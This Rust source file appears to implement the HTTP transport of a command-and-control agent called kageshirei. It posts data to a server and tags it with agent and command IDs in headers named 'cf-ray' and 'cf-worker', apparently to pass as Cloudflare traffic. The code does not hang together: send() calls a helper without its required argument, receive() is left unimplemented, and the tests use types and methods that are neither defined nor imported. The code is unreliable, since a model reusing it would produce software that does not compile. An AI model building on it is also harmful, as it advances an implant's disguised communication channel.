use alloc::{
    string::{String, ToString},
    sync::Arc,
};
use alloc::vec::Vec;
use core::future::Future;
use kageshirei_communication_protocol::{
    Protocol,
    Metadata
};
use kageshirei_communication_protocol::error::Protocol as ProtocolError;
use super::client::WinHttpClient;

/// Define the WinHTTP protocol for sending and receiving data.
pub struct HttpProtocol {
    /// The WinHTTP client used to send requests.
    /// This client maintains session and connection handles for efficient reuse across requests.
    client:           WinHttpClient,
    /// The base URL for the protocol. This is the URL to which requests are sent.
    base_url:         String,
}

impl HttpProtocol {
    /// Create a new WinHTTP protocol.
    pub fn new(base_url: String) -> Self {
        Self {
            client: WinHttpClient::new(),
            base_url,
        }
    }

    /// Get the request URL.
    ///
    /// # Arguments
    ///
    /// * `metadata` - The metadata needed to build the request URL.
    ///
    /// # Returns
    ///
    /// The request URL.
    fn get_request_url(&self, metadata: &Option<Arc<Metadata>>) -> String {
        let mut url = self.base_url.clone();

        // Ensure the URL ends with a slash.
        if !url.ends_with('/') {
            url.push('/');
        }

        #[expect(
            clippy::pattern_type_mismatch,
            reason = "Cannot dereference nor explicitly match against reference"
        )]
        if let Some(meta) = metadata {
            // Append the path to the URL if it is provided.
            if let Some(ref path) = meta.path {
                url.push_str(path);
            }
        }

        url
    }
}

impl Protocol for HttpProtocol {
    async fn send(
        &mut self,
        data: Vec<u8>,
        metadata: Option<Arc<Metadata>>,
    ) -> Result<Vec<u8>, ProtocolError> {
        // Send the request using the WinHTTP client.
        let response = self.client.post(&self.get_request_url(), data.to_vec()).await?;
        Ok(response)
    }

    fn receive(&mut self, metadata: Option<Arc<Metadata>>) -> Result<Vec<u8>, ProtocolError> {
        todo!()
    }
}

#[cfg(test)]
mod tests {
    use alloc::string::ToString;

    use axum::{http::HeaderMap, routing::get, Router};
    use kageshirei_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
    use serde::Deserialize;
    use tokio::select;
    use tokio_util::sync::CancellationToken;

    use super::*;

    async fn make_dummy_server(cancellation_token: CancellationToken, router: Router<()>) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:8080")
            .await
            .unwrap();

        axum::serve(listener, router)
            .with_graceful_shutdown(async move {
                select! {
                    _ = cancellation_token.cancelled() => {},
                }
            })
            .await
            .unwrap();
    }

    #[derive(Serialize, Deserialize, Debug)]
    struct SampleData {
        foo: String,
    }

    impl WithMetadata for SampleData {
        fn get_metadata(&self) -> Arc<Metadata> {
            Arc::new(Metadata {
                request_id: "an3a8hlnrr4638d30yef0oz5sncjdx5v".to_string(),
                command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
                agent_id:   "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
                path:       None,
            })
        }
    }

    #[test]
    fn test_read() {
        let encryptor = IdentEncryptor;
        let protocol = WinHttpProtocol::new("http://localhost:8080".to_string());

        let mut check = BytesMut::new();
        for i in magic_numbers::JSON.iter() {
            check.put_u8(*i);
        }
        for i in "{\"foo\":\"bar\"}".as_bytes() {
            check.put_u8(*i);
        }
        let data = check.freeze();
        let result = protocol.read::<SampleData>(data, Some(encryptor));
        assert!(result.is_ok());
        let value = result.unwrap();
        assert_eq!(value.foo, "bar");
    }

    #[tokio::test]
    async fn test_write() {
        let cancellation_token = CancellationToken::new();
        let handler = |headers: HeaderMap, body: Bytes| {
            async move {
                assert_eq!(headers.get("content-type").unwrap(), "text/plain");
                assert_eq!(
                    headers.get("cf-ray").unwrap(),
                    "an3a8hlnrr4638d30yef0oz5sncjdx5v.an3a8hlnrr4638d30yef0oz5sncjdx5x"
                );
                assert_eq!(
                    headers.get("cf-worker").unwrap(),
                    "an3a8hlnrr4638d30yef0oz5sncjdx5w"
                );

                let mut check = BytesMut::new();
                for i in magic_numbers::JSON.iter() {
                    check.put_u8(*i);
                }
                for i in "{\"foo\":\"bar\"}".as_bytes() {
                    check.put_u8(*i);
                }

                assert_eq!(body, check.freeze());
                "Ok"
            }
        };
        let router = Router::new().route("/", get(handler).post(handler));

        let call = make_dummy_server(cancellation_token.clone(), router);
        let server_handle = tokio::spawn(async move {
            call.await;
        });

        let encryptor = IdentEncryptor;
        let mut protocol = WinHttpProtocol::new("http://localhost:8080".to_string());
        let data = SampleData {
            foo: "bar".to_string(),
        };

        let _result = protocol.write(data, Some(encryptor)).await;

        cancellation_token.cancel();
        server_handle.await.unwrap();
    }
}
